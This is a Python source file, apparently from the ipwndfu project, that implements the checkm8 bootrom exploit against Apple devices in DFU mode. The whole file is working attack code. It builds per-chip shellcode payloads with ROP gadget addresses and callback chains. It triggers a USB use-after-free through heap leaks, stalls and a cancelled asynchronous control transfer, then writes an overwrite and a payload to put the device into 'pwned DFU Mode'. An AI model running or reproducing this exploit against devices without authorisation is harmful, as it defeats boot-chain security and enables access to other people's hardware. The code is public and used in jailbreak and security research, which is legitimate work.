from __future__ import annotations

import array
import ctypes
import dataclasses
import pkgutil
import struct
import sys
import time
import typing
import weakref
from contextlib import suppress
from typing import TYPE_CHECKING, Optional, Tuple, Union

import usb  # type: ignore

from ipwndfu import device_platform, dfu, usbutil
from ipwndfu.utilities import from_hex_str

if TYPE_CHECKING:
    from usb.core import Device  # type: ignore

# Must be global so garbage collector never frees it
request = None
transfer_ptr = None
never_free_device = None


@dataclasses.dataclass
class DeviceConfig:
    version: str
    cpid: int
    large_leak: Optional[int]
    overwrite: bytes
    overwrite_offset: int
    hole: Optional[int]
    leak: Optional[int]

    def __post_init__(self) -> None:
        assert len(self.overwrite) <= 0x800
        if not self.hole:
            self.hole = 0


@dataclasses.dataclass
class Checkm8Constants:
    usb_descriptors: int
    usb_serial_number: int
    usb_create_string_descriptor: int
    usb_srnm_string_descriptor: int
    payload_destination: int
    payload_offset: int
    payload_size: int
    payload_pointer: int

    @property
    def values(self) -> list[int]:
        return list(dataclasses.astuple(self))


@dataclasses.dataclass
class Checkm8Overwrite:
    preamble: int
    pack: str
    args: typing.List[Union[str, int]]

    _checkm8: typing.Optional[Checkm8] = None

    def __post_init__(self):
        if not self.args:
            self.args = []

    def generate_overwrite(self, platform: device_platform.DevicePlatform):
        def get_value(symbol: typing.Union[str, int]) -> int:
            if isinstance(symbol, int):
                return symbol

            return platform.gadgets[symbol]

        values = [get_value(symbol) for symbol in self.args]

        return (b"\0" * self.preamble) + struct.pack(self.pack, *values)


@dataclasses.dataclass
class Checkm8:
    constants: Checkm8Constants
    overwrite: Checkm8Overwrite
    hole: typing.Optional[int] = None
    leak: typing.Optional[int] = None
    large_leak: typing.Optional[int] = None

    _device_platform: typing.Optional[device_platform.DevicePlatform] = None

    def __post_init__(self):
        if isinstance(self.constants, dict):
            self.constants = Checkm8Constants(**self.constants)
        if isinstance(self.overwrite, dict):
            self.overwrite = Checkm8Overwrite(**self.overwrite)
            self.overwrite._checkm8 = weakref.ref(self)

    @classmethod
    def from_platform(cls, platform: device_platform.DevicePlatform) -> Checkm8:
        if "checkm8" not in platform.exploit_configs:
            print("ERROR: This is not a checkm8 compatible device. Exiting.")
            sys.exit(1)

        result = cls(**platform.exploit_configs["checkm8"])
        result._device_platform = platform
        return result

    @property
    def device_platform(self):
        return self._device_platform

    def device_config(self) -> DeviceConfig:
        assert self._device_platform

        return DeviceConfig(
            self._device_platform.srtg,
            self._device_platform.cpid,
            self.large_leak,
            self.overwrite.generate_overwrite(self._device_platform),
            0,
            self.hole,
            self.leak,
        )


def libusb1_create_ctrl_transfer(device: "Device", request, timeout):
    assert usb.backend.libusb1._lib

    ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)
    assert ptr is not None

    transfer = ptr.contents
    transfer.dev_handle = device._ctx.handle.handle
    transfer.endpoint = 0  # EP0
    transfer.type = 0  # LIBUSB_TRANSFER_TYPE_CONTROL
    transfer.timeout = timeout
    transfer.buffer = request.buffer_info()[0]  # C-pointer to request buffer
    transfer.length = len(request)
    transfer.user_data = None
    transfer.callback = usb.backend.libusb1._libusb_transfer_cb_fn_p(0)  # NULL
    transfer.flags = 1 << 1  # LIBUSB_TRANSFER_FREE_BUFFER

    return ptr


def libusb1_async_ctrl_transfer(
    device: "Device",
    bm_request_type: int,
    b_request: int,
    w_value: int,
    w_index: int,
    data: bytes,
    timeout: float,
) -> None:
    if usb.backend.libusb1._lib is not device._ctx.backend.lib:
        print(
            "ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting."
        )
        sys.exit(1)

    global request, transfer_ptr, never_free_device
    request_timeout = int(timeout) if timeout >= 1 else 0
    start = time.time()
    never_free_device = device
    request = array.array(
        "B",
        struct.pack("<BBHHH", bm_request_type, b_request, w_value, w_index, len(data))
        + data,
    )
    transfer_ptr = libusb1_create_ctrl_transfer(device, request, request_timeout)
    assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0

    while time.time() - start < timeout / 1000.0:
        pass

    # Prototype of libusb_cancel_transfer is missing from pyusb
    usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [
        ctypes.POINTER(usb.backend.libusb1._libusb_transfer)
    ]
    assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0


def libusb1_no_error_ctrl_transfer(
    device: "Device",
    bm_request_type: int,
    b_request: int,
    w_value: int,
    w_index: int,
    data_or_w_length: Union[int, bytes],
    timeout: int,
) -> None:
    with suppress(usb.core.USBError):
        device.ctrl_transfer(
            bm_request_type, b_request, w_value, w_index, data_or_w_length, timeout
        )


def usb_rop_callbacks(
    address: int, func_gadget: int, callbacks: list[Tuple[int, int]]
) -> bytes:
    data = b""
    for i in range(0, len(callbacks), 5):
        block1 = b""
        block2 = b""
        for j in range(5):
            address += 0x10
            if j == 4:
                address += 0x50
            if i + j < len(callbacks) - 1:
                block1 += struct.pack("<2Q", func_gadget, address)
                block2 += struct.pack("<2Q", callbacks[i + j][1], callbacks[i + j][0])
            elif i + j == len(callbacks) - 1:
                block1 += struct.pack("<2Q", func_gadget, 0)
                block2 += struct.pack("<2Q", callbacks[i + j][1], callbacks[i + j][0])
            else:
                block1 += struct.pack("<2Q", 0, 0)
        data += block1 + block2
    return data


# TODO: assert we are within limits
def asm_arm64_branch(src: int, dest: int) -> bytes:
    if src > dest:
        value = 0x18000000 - (src - dest) // 4
    else:
        value = 0x14000000 + (dest - src) // 4
    return struct.pack("<I", value)


# TODO: check if start offset % 4 would break it
# LDR X7, [PC, #OFFSET]; BR X7
def asm_arm64_x7_trampoline(dest: int) -> bytes:
    return from_hex_str("47000058E0001FD6") + struct.pack("<Q", dest)


# THUMB +0 [0xF000F8DF, ADDR]  LDR.W   PC, [PC]
# THUMB +2 [0xF002F8DF, ADDR]  LDR.W   PC, [PC, #2]
def asm_thumb_trampoline(src, dest):
    assert src % 2 == 1 and dest % 2 == 1
    if src % 4 == 1:
        return struct.pack("<2I", 0xF000F8DF, dest)
    else:
        return struct.pack("<2I", 0xF002F8DF, dest)


def prepare_shellcode(name: str, constants: list[int]) -> bytes:
    if name.endswith("_armv7"):
        fmt = "<%sI"
        size = 4
    elif name.endswith("_arm64"):
        fmt = "<%sQ"
        size = 8
    else:
        print(
            'ERROR: Shellcode name "%s" does not end with known architecture. Exiting.'
            % name
        )
        sys.exit(1)

    shellcode = pkgutil.get_data("ipwndfu", f"bin/{name}.bin")
    assert shellcode

    # Shellcode has placeholder values for constants; check they match and
    # replace with constants from config
    placeholders_offset = len(shellcode) - size * len(constants)
    for i in range(len(constants)):
        offset = placeholders_offset + size * i
        (value,) = struct.unpack(fmt % "1", shellcode[offset : offset + size])
        assert value == 0xBAD00001 + i

    return shellcode[:placeholders_offset] + struct.pack(
        fmt % len(constants), *constants
    )


PAYLOAD_OFFSET_ARMV7 = 0x180
PAYLOAD_SIZE_ARMV7 = 0x140
PAYLOAD_OFFSET_ARM64 = 0x180
PAYLOAD_SIZE_ARM64 = 0x240


def payload(cpid: int) -> bytes:
    this_platform = device_platform.DevicePlatform.platform_for_cpid(cpid)

    assert this_platform

    checkm8_config = Checkm8(**this_platform.exploit_configs["checkm8"])
    checkm8_constants = checkm8_config.constants

    if cpid == 0x8947:
        s5l8947x_handler = (
            asm_thumb_trampoline(0x34039800 + 1, 0x7BC8 + 1)
            + prepare_shellcode("usb_0xA1_2_armv7", this_platform.usb.constants)[8:]
        )
        s5l8947x_shellcode = prepare_shellcode(
            "checkm8_armv7", checkm8_constants.values
        )
        assert len(s5l8947x_shellcode) <= PAYLOAD_OFFSET_ARMV7
        assert len(s5l8947x_handler) <= PAYLOAD_SIZE_ARMV7
        return (
            s5l8947x_shellcode
            + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8947x_shellcode))
            + s5l8947x_handler
        )

    if cpid == 0x8950:
        s5l8950x_handler = (
            asm_thumb_trampoline(0x10079800 + 1, 0x8160 + 1)
            + prepare_shellcode("usb_0xA1_2_armv7", this_platform.usb.constants)[8:]
        )
        s5l8950x_shellcode = prepare_shellcode(
            "checkm8_armv7", checkm8_constants.values
        )
        assert len(s5l8950x_shellcode) <= PAYLOAD_OFFSET_ARMV7
        assert len(s5l8950x_handler) <= PAYLOAD_SIZE_ARMV7
        return (
            s5l8950x_shellcode
            + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8950x_shellcode))
            + s5l8950x_handler
        )

    if cpid == 0x8955:
        s5l8955x_handler = (
            asm_thumb_trampoline(0x10079800 + 1, 0x81A0 + 1)
            + prepare_shellcode("usb_0xA1_2_armv7", this_platform.usb.constants)[8:]
        )
        s5l8955x_shellcode = prepare_shellcode(
            "checkm8_armv7", checkm8_constants.values
        )
        assert len(s5l8955x_shellcode) <= PAYLOAD_OFFSET_ARMV7
        assert len(s5l8955x_handler) <= PAYLOAD_SIZE_ARMV7
        return (
            s5l8955x_shellcode
            + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8955x_shellcode))
            + s5l8955x_handler
        )

    if cpid == 0x8960:
        s5l8960x_handler = (
            asm_arm64_x7_trampoline(0x10000CFB4)
            + asm_arm64_branch(0x10, 0x0)
            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
        )
        s5l8960x_shellcode = prepare_shellcode(
            "checkm8_arm64", checkm8_constants.values
        )
        assert len(s5l8960x_shellcode) <= PAYLOAD_OFFSET_ARM64
        assert len(s5l8960x_handler) <= PAYLOAD_SIZE_ARM64
        return (
            s5l8960x_shellcode
            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(s5l8960x_shellcode))
            + s5l8960x_handler
        )

    if cpid == 0x8002:
        t8002_handler = (
            asm_thumb_trampoline(0x48806E00 + 1, 0x95F0 + 1)
            + prepare_shellcode("usb_0xA1_2_armv7", this_platform.usb.constants)[8:]
        )
        t8002_shellcode = prepare_shellcode("checkm8_armv7", checkm8_constants.values)
        assert len(t8002_shellcode) <= PAYLOAD_OFFSET_ARMV7
        assert len(t8002_handler) <= PAYLOAD_SIZE_ARMV7
        return (
            t8002_shellcode
            + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(t8002_shellcode))
            + t8002_handler
        )

    if cpid == 0x8004:
        t8004_handler = (
            asm_thumb_trampoline(0x48806E00 + 1, 0x877C + 1)
            + prepare_shellcode("usb_0xA1_2_armv7", this_platform.usb.constants)[8:]
        )
        t8004_shellcode = prepare_shellcode("checkm8_armv7", checkm8_constants.values)
        assert len(t8004_shellcode) <= PAYLOAD_OFFSET_ARMV7
        assert len(t8004_handler) <= PAYLOAD_SIZE_ARMV7
        return (
            t8004_shellcode
            + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(t8004_shellcode))
            + t8004_handler
        )

    if cpid == 0x8010:
        t8010_func_gadget = 0x10000CC4C
        t8010_enter_critical_section = 0x10000A4B8
        t8010_exit_critical_section = 0x10000A514
        t8010_dc_civac = 0x10000046C
        t8010_write_ttbr0 = 0x1000003E4
        t8010_tlbi = 0x100000434
        t8010_dmb = 0x100000478
        t8010_handle_interface_request = 0x10000DFB8
        t8010_callbacks = [
            (t8010_dc_civac, 0x1800B0600),
            (t8010_dmb, 0),
            (t8010_enter_critical_section, 0),
            (t8010_write_ttbr0, 0x1800B0000),
            (t8010_tlbi, 0),
            (0x1820B0610, 0),
            (t8010_write_ttbr0, 0x1800A0000),
            (t8010_tlbi, 0),
            (t8010_exit_critical_section, 0),
            (0x1800B0000, 0),
        ]
        t8010_handler = (
            asm_arm64_x7_trampoline(t8010_handle_interface_request)
            + asm_arm64_branch(0x10, 0x0)
            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
        )
        t8010_shellcode = prepare_shellcode("checkm8_arm64", checkm8_constants.values)
        assert len(t8010_shellcode) <= PAYLOAD_OFFSET_ARM64
        assert len(t8010_handler) <= PAYLOAD_SIZE_ARM64
        t8010_shellcode = (
            t8010_shellcode
            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(t8010_shellcode))
            + t8010_handler
        )
        assert len(t8010_shellcode) <= 0x400
        return struct.pack(
            "<1024sQ504x2Q496s32x",
            t8010_shellcode,
            0x1000006A5,
            0x60000180000625,
            0x1800006A5,
            prepare_shellcode("t8010_t8011_disable_wxn_arm64", []),
        ) + usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks)
    if cpid == 0x8011:
        t8011_func_gadget = 0x10000CCEC
        t8011_dc_civac = 0x10000047C
        t8011_write_ttbr0 = 0x1000003F4
        t8011_tlbi = 0x100000444
        t8011_dmb = 0x100000488
        t8011_handle_interface_request = 0x10000E08C
        t8011_callbacks = [
            (t8011_dc_civac, 0x1800B0600),
            (t8011_dc_civac, 0x1800B0000),
            (t8011_dmb, 0),
            (t8011_write_ttbr0, 0x1800B0000),
            (t8011_tlbi, 0),
            (0x1820B0610, 0),
            (t8011_write_ttbr0, 0x1800A0000),
            (t8011_tlbi, 0),
            (0x1800B0000, 0),
        ]

        t8011_handler = (
            asm_arm64_x7_trampoline(t8011_handle_interface_request)
            + asm_arm64_branch(0x10, 0x0)
            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
        )
        t8011_shellcode = prepare_shellcode("checkm8_arm64", checkm8_constants.values)
        assert len(t8011_shellcode) <= PAYLOAD_OFFSET_ARM64
        assert len(t8011_handler) <= PAYLOAD_SIZE_ARM64
        t8011_shellcode = (
            t8011_shellcode
            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(t8011_shellcode))
            + t8011_handler
        )
        assert len(t8011_shellcode) <= 0x400
        return struct.pack(
            "<1024sQ504x2Q496s32x",
            t8011_shellcode,
            0x1000006A5,
            0x60000180000625,
            0x1800006A5,
            prepare_shellcode("t8010_t8011_disable_wxn_arm64", []),
        ) + usb_rop_callbacks(0x1800B0800, t8011_func_gadget, t8011_callbacks)

    if cpid == 0x7000:
        s7000_handler = (
            asm_arm64_x7_trampoline(0x10000EEE4)
            + asm_arm64_branch(0x10, 0x0)
            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
        )
        s7000_shellcode = prepare_shellcode(
            "checkm8_nopaddingcorruption_arm64", checkm8_constants.values
        )
        assert len(s7000_shellcode) <= PAYLOAD_OFFSET_ARM64
        assert len(s7000_handler) <= PAYLOAD_SIZE_ARM64
        return (
            s7000_shellcode
            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(s7000_shellcode))
            + s7000_handler
        )

    if cpid == 0x8003:
        s8003_handler = (
            asm_arm64_x7_trampoline(0x10000F1B0)
            + asm_arm64_branch(0x10, 0x0)
            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
        )
        s8003_shellcode = prepare_shellcode(
            "checkm8_nopaddingcorruption_arm64", checkm8_constants.values
        )

        assert len(s8003_shellcode) <= PAYLOAD_OFFSET_ARM64

        assert len(s8003_handler) <= PAYLOAD_SIZE_ARM64

        return (
            s8003_shellcode
            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(s8003_shellcode))
            + s8003_handler
        )

    if cpid == 0x8012:
        t8012_func_gadget = 0x100008DA0
        t8012_write_ttbr0 = 0x100000444
        t8012_tlbi = t8012_write_ttbr0 + 0x50
        t8012_handle_interface_request = 0x10000BFFC
        t8012_callbacks = [
            (t8012_write_ttbr0, 0x18001C000),
            (t8012_tlbi, 0),
            (0x18001C610 - 0x002000000, 0),
            (t8012_write_ttbr0, 0x18000C000),
            (t8012_tlbi, 0),
            (0x18001C000 - 0x002000000, 0),
        ]

        ttbr_patch_code = (
            b"\xe1\x07\x61\xb2\x22\x30\x40\x91\x21\x00\xc0\xd2\x21\x94\x18\x91\x41\xf4\x02\xf9\xe1\x07"
            b"\x61\xb2\x21\x94\x18\x91\x41\xf8\x02\xf9\xe1\x07\x61\xb2\x21\x94\x1a\x91\x41\xfc\x02\xf9"
            b"\xbf\x3f\x03\xd5\xc0\x03\x5f\xd6"
        )
        t8012_handler = (
            asm_arm64_x7_trampoline(t8012_handle_interface_request)
            + asm_arm64_branch(0x10, 0x0)
            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
        )
        t8012_shellcode = prepare_shellcode("checkm8_arm64", checkm8_constants.values)
        assert len(t8012_shellcode) <= PAYLOAD_OFFSET_ARM64
        assert len(t8012_handler) <= PAYLOAD_SIZE_ARM64
        t8012_shellcode = (
            t8012_shellcode
            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(t8012_shellcode))
            + t8012_handler
        )
        assert len(t8012_shellcode) <= 0x400
        return struct.pack(
            "<1024sQ496x2Q8x496s32x",
            t8012_shellcode,
            0x1000006A5,
            0x1800006A5,
            0x180000625,
            ttbr_patch_code,
        ) + usb_rop_callbacks(0x18001C800, t8012_func_gadget, t8012_callbacks)

    if cpid == 0x8015:
        t8015_load_write_gadget = 0x10000945C
        t8015_write_sctlr_gadget = 0x1000003EC
        t8015_func_gadget = 0x10000A9AC
        t8015_write_ttbr0 = 0x10000045C
        t8015_tlbi = 0x1000004AC
        t8015_dc_civac = 0x1000004D0
        t8015_dmb = 0x1000004F0
        t8015_handle_interface_request = 0x10000BCCC
        t8015_callbacks = [
            (t8015_dc_civac, 0x18001C800),
            (t8015_dc_civac, 0x18001C840),
            (t8015_dc_civac, 0x18001C880),
            (t8015_dmb, 0),
            (t8015_write_sctlr_gadget, 0x100D),
            (t8015_load_write_gadget, 0x18001C000),
            (t8015_load_write_gadget, 0x18001C010),
            (t8015_write_ttbr0, 0x180020000),
            (t8015_tlbi, 0),
            (t8015_load_write_gadget, 0x18001C020),
            (t8015_write_ttbr0, 0x18000C000),
            (t8015_tlbi, 0),
            (0x18001C800, 0),
        ]
        t8015_callback_data = usb_rop_callbacks(
            0x18001C020, t8015_func_gadget, t8015_callbacks
        )
        t8015_handler = (
            asm_arm64_x7_trampoline(t8015_handle_interface_request)
            + asm_arm64_branch(0x10, 0x0)
            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
        )
        t8015_shellcode = prepare_shellcode("checkm8_arm64", checkm8_constants.values)
        assert len(t8015_shellcode) <= PAYLOAD_OFFSET_ARM64
        assert len(t8015_handler) <= PAYLOAD_SIZE_ARM64
        t8015_shellcode = (
            t8015_shellcode
            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(t8015_shellcode))
            + t8015_handler
        )
        return struct.pack(
            "<6Q16x448s1536x1024s",
            0x180020400 - 8,
            0x1000006A5,
            0x180020600 - 8,
            0x180000625,
            0x18000C600 - 8,
            0x180000625,
            t8015_callback_data,
            t8015_shellcode,
        )

    raise NotImplementedError("This SoC is not yet supported")


def all_exploit_configs() -> list[DeviceConfig]:
    t8010_nop_gadget = 0x10000CC6C
    t8011_nop_gadget = 0x10000CD0C
    t8012_nop_gadget = 0x100008DB8
    t8015_nop_gadget = 0x10000A9C4

    s5l8947x_overwrite = b"\0" * 0x660 + struct.pack("<20xI4x", 0x34000000)
    s5l895xx_overwrite = b"\0" * 0x640 + struct.pack("<20xI4x", 0x10000000)
    t800x_overwrite = b"\0" * 0x5C0 + struct.pack("<20xI4x", 0x48818000)
    s5l8960x_overwrite = b"\0" * 0x580 + struct.pack("<32xQ8x", 0x180380000)
    t8010_overwrite = b"\0" * 0x580 + struct.pack(
        "<32x2Q16x32x2QI",
        t8010_nop_gadget,
        0x1800B0800,
        t8010_nop_gadget,
        0x1800B0800,
        0xBEEFBEEF,
    )
    t8011_overwrite = b"\0" * 0x500 + struct.pack(
        "<32x2Q16x32x2QI",
        t8011_nop_gadget,
        0x1800B0800,
        t8011_nop_gadget,
        0x1800B0800,
        0xBEEFBEEF,
    )
    t8012_overwrite = b"\0" * 0x540 + struct.pack(
        "<32x2Q", t8012_nop_gadget, 0x18001C800
    )
    t8015_overwrite = b"\0" * 0x500 + struct.pack(
        "<32x2Q16x32x2Q12xI",
        t8015_nop_gadget,
        0x18001C020,
        t8015_nop_gadget,
        0x18001C020,
        0xBEEFBEEF,
    )

    return [
        DeviceConfig("iBoot-1458.2", 0x8947, 626, s5l8947x_overwrite, 0, None, None),
        # S5L8947 (DFU loop)     1.97 seconds
        DeviceConfig("iBoot-1145.3", 0x8950, 659, s5l895xx_overwrite, 0, None, None),
        # S5L8950 (buttons)      2.30 seconds
        DeviceConfig("iBoot-1145.3.3", 0x8955, 659, s5l895xx_overwrite, 0, None, None),
        # S5L8955 (buttons)      2.30 seconds
        DeviceConfig("iBoot-1704.10", 0x8960, 7936, s5l8960x_overwrite, 0, None, None),
        # S5L8960 (buttons)     13.97 seconds
        DeviceConfig("iBoot-2651.0.0.1.31", 0x8002, None, t800x_overwrite, 0, 5, 1),
        # T8002 (DFU loop)  NEW: 1.27 seconds
        DeviceConfig("iBoot-2651.0.0.3.3", 0x8004, None, t800x_overwrite, 0, 5, 1),
        # T8004 (buttons)   NEW: 1.06 seconds
        DeviceConfig("iBoot-2696.0.0.1.33", 0x8010, None, t8010_overwrite, 0, 5, 1),
        # T8010 (buttons)   NEW: 0.68 seconds
        DeviceConfig("iBoot-3135.0.0.2.3", 0x8011, None, t8011_overwrite, 0, 6, 1),
        # T8011 (buttons)   NEW: 0.87 seconds
        DeviceConfig("iBoot-3401.0.0.1.16", 0x8012, None, t8012_overwrite, 0, 6, 1),
        DeviceConfig("iBoot-3332.0.0.1.23", 0x8015, None, t8015_overwrite, 0, 6, 1),
        # T8015 (DFU loop)  NEW: 0.66 seconds
    ]


def exploit_config(serial_number: str) -> Tuple[bytes, DeviceConfig]:
    for config in all_exploit_configs():
        if f"SRTG:[{config.version}]" in serial_number:
            return payload(config.cpid), config
        elif f"CPID:{config.cpid:02x}" in serial_number:
            print("ERROR: CPID is compatible, but serial number string does not match.")
            print(
                "Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting."
            )
            sys.exit(1)

    print("ERROR: This is not a compatible device. Exiting.")
    sys.exit(1)


def exploit(match: None = None) -> None:
    print("*** checkm8 exploit by axi0mX ***")

    device = dfu.acquire_device(match=match)
    assert device
    start = time.time()
    print("Found:", device.serial_number)
    if "PWND:[" in device.serial_number:
        print("Device is already in pwned DFU Mode. Not executing exploit.")
        return
    payload, config = exploit_config(device.serial_number)

    if config.large_leak is not None:
        usbutil.usb_req_stall(device)
        for _ in range(config.large_leak):
            usbutil.usb_req_leak(device)
        usbutil.usb_req_no_leak(device)
    else:
        usbutil.stall(device)
        if config.hole:
            for _ in range(config.hole):
                usbutil.no_leak(device)
        usbutil.usb_req_leak(device)
        usbutil.no_leak(device)
    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device(match=match)
    assert device
    device.__getattribute__("serial_number")
    libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b"A" * 0x800, 0.0001)

    # Advance buffer offset before triggering the UaF to prevent trashing the heap
    libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
    dfu.release_device(device)

    time.sleep(0.5)

    device = dfu.acquire_device(match=match)
    assert device
    usbutil.usb_req_stall(device)
    if config.large_leak is not None:
        usbutil.usb_req_leak(device)
    else:
        if config.leak:
            for _ in range(config.leak):
                usbutil.usb_req_leak(device)
    libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)
    for i in range(0, len(payload), 0x800):
        libusb1_no_error_ctrl_transfer(
            device, 0x21, 1, 0, 0, payload[i : i + 0x800], 100
        )
    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device(match=match)
    assert device

    if "PWND:[checkm8]" not in device.serial_number:
        print("ERROR: Exploit failed. Device did not enter pwned DFU Mode.")
        sys.exit(1)
    print("Device is now in pwned DFU Mode.")
    print(f"({(time.time() - start):0.2f} seconds)")
    dfu.release_device(device)


def exploit_a8_a9(match=None):
    print("*** checkm8 exploit by axi0mX ***")

    device = dfu.acquire_device(match=match)
    start = time.time()
    print("Found:", device.serial_number)
    if "PWND:[" in device.serial_number:
        print("Device is already in pwned DFU Mode. Not executing exploit.")
        return
    padding = 0x400 + 0x80 + 0x80
    overwrite = struct.pack("<32xQQ", 0x180380000, 0)
    if any(cpid in device.serial_number for cpid in ["CPID:8000", "CPID:8003"]):
        payload_a8_a9 = payload(0x8003)
    elif "CPID:7000" in device.serial_number:
        payload_a8_a9 = payload(0x7000)
    else:
        payload_a8_a9 = None

    if not payload_a8_a9:
        raise NotImplementedError(
            f"exploit_a8_a9 does not support {device.serial_number}"
        )

    usbutil.stall(device)
    usbutil.leak(device)
    for _ in range(40):
        usbutil.no_leak(device)
    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device(match=match)
    device.__getattribute__("serial_number")
    libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b"A" * 0x800, 0.0001)
    libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, b"A" * padding, 10)
    libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
    dfu.release_device(device)

    time.sleep(0.5)

    device = dfu.acquire_device(match=match)
    usbutil.usb_req_stall(device)
    usbutil.usb_req_leak(device)
    usbutil.usb_req_leak(device)
    usbutil.usb_req_leak(device)
    libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, overwrite, 100)
    for i in range(0, len(payload_a8_a9), 0x800):
        libusb1_no_error_ctrl_transfer(
            device, 0x21, 1, 0, 0, payload_a8_a9[i : i + 0x800], 100
        )
    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device(match=match)
    if "PWND:[checkm8]" not in device.serial_number:
        print("ERROR: Exploit failed. Device did not enter pwned DFU Mode.")
        sys.exit(1)
    print("Device is now in pwned DFU Mode.")
    print(f"({(time.time() - start):0.2f} seconds)")
    dfu.release_device(device)
